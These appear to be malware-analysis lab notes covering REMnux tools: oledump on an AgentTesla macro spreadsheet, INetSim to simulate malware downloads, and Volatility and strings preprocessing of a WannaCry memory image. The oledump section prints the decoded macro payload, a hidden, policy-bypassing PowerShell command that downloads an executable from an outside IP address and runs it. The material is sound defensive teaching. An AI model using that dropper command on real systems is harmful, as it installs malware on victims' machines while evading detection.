The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.


### Oldedump
Oledump.py is a Python tool that analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format. OLE stands for Object Linking and Embedding, a proprietary technology developed by Microsoft. 
OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

**command-** oledump.py <file_name>

### File analysis image-
 Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside xl/vbaProject.bin. Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called data streams. 

Now, we should be aware of the data stream with the capital letter M. This means there is a Macro, and you might want to check out this data stream, 'VBA/ThisWorkbook'.

**command-** So, let's check it out! Let's run the command oledump.py agenttesla.xlsm -s 4. This command will run the oledump and look into the actual data stream of interest using the parameter -s 4,  wherein the -s parameter is short for -select  and the number four(4) as the data stream of interest is in the 4th place(A4: M 688 'VBA/ThisWorkbook')

**command-** oledump.py agenttesla.xlsm -s 4 --vbadecompress
We will run an additional parameter --vbadecompress in addition to the previous command. When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.

After putting it in cyberchef the output that came was this:
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;

1. So, in PowerShell, running the -WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, hidden means that the PowerShell window won’t be visible to the user.
2. By default, PowerShell restricts script execution for security reasons. The -executionpolicy parameter allows you to override this policy. The bypass means that the execution policy is temporarily ignored, allowing any script to run without restriction.
The Invoke-WebRequest is commonly used for downloading files from the internet.
3. The -Uri Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource Doc-3737122pdf.exe from http://193.203.203.67/rt/.
4. The -OutFile specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
The Start-Process is used to execute the downloaded file that is stored in $TempFile after the web request.

(To summarize, when the document agenttesla.xlsm is opened, a Macro will run! This Macro contains a VBA script. The script will run and will be running a PowerShell to download a file named Doc-3737122pdf.exe from http://193.203.203.67/rt/, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (Doc-3737122pdf.exe). This is a usual technique used by threat actors to avoid early detection. )

# InetSim
### 1. REMnux
1. sudo nano /etc/inetsim/inetsim.conf

2. Remove the comment or #, then change the value of dns_default_ip from 0.0.0.0 to the machine’s IP address you have identified earlier. In our case, this is 10.49.143.163

3. Confirm that the changes have been successful by checking the value of dns_default_ip using this command cat /etc/inetsim/inetsim.conf | grep dns_default_ip

4. Finally, run the command sudo inetsim to start the tool.

### 2. Attackbox
1. From this VM, open a browser and go to our REMnux's IP address using the command https://10.49.143.163. This will prompt a Security Risk; ignore it, click Advance, then Accept the Risk and Continue.

2. Once done, you should be redirected to the INetSim's homepage!

**Additional**
1. One usual malware behaviour is downloading another binary or script. We will try to mimic this behaviour by getting another file from INetsim. We can do this via the CLI or browser, but let's use the CLI to make it more realistic. Use this command: sudo wget https://10.49.143.163/second_payload.zip --no-check-certificate.

2. You can try downloading another file as well. For example, try downloading second_payload.ps1 by using the command:sudo wget https://10.49.143.163/second_payload.ps1 --no-check-certificate.

3. All of these are fake files! Try to open the second_payload.ps1. When executed, this will direct you to INetSim's homepage.

4. What we did here is **mimic a malware's behaviour, wherein it will try to reach out to a server or URL and then download a secondary file that may contain another malware.**

## Connection Report
Lastly, go back to your REMnux VM and stop INetSim. By default, it will create a report on its captured connections. This is usually saved in /var/log/inetsim/report/ directory. 

# Digital Forensics 

## Preprocessing with Volatility
we will use the Volatility 3 tool version. However, we won’t go deep into the investigation and analysis part of the result—we could write a whole book about it! Instead, we want you to be familiar with and get a feel for how the tool works. Run the command as instructed and wait for the result to show. Each plugin takes 2-3 minutes to show the output.

Here are some of the parameters or plugins we will use. We will focus on Windows plugins.
1. **PsTree**
This plugin lists processes in a tree based on their parent process ID.
command- vol3 -f wcry.mem windows.pstree.PsTree

2. **PsList**
This plugin is used to list currently active processes in the machine.
command- vol3 -f wcry.mem windows.pslist.PsList

3. **CmdLine**
This plugin is used to list process command line arguements.
command- vol3 -f wcry.mem windows.cmdline.CmdLine

4. **FileScan**
This plugin scans for file objects in a particular Windows memory image. 
command- vol3 -f wcry.mem windows.filescan.FileScan

5. **DllList**
This plugin lists the loaded modules in a particular Windows memory image.
command- vol3 -f wcry.mem windows.dlllist.DllList

6. **PsScan**
This plugin is used to scan for processes present in a particular Windows memory image.
command- vol3 -f wcry.mem windows.psscan.PsScan

7. **Malfind**
This plugin is used to lists process memory ranges that potentially contain injected code.
command- vol3 -f wcry.mem windows.malfind.Malfind

# Preprocessing in Loops
command- for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done

1. We created a variable named $plugin with values of each volatility plugin
2. Then ran vol3 parameters -q, which means quiet mode or does not show the progress in the terminal
3. And -f, which means read from the memory capture.
4. The plugin > wcry.plugin.done; means run volatility with the plugins and output it to a file with wcry at the beginning of the text, followed by the name of the plugins and with an extension of .txt. Repeat until the value of variable $plugin is used.

# Preprocessing with Strings
Next, we will preprocess the memory image with the Linux strings utility. We will extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings. See the command below.
1. strings wcry.mem > wcry.strings.ascii.txt
2. strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
3.  strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt

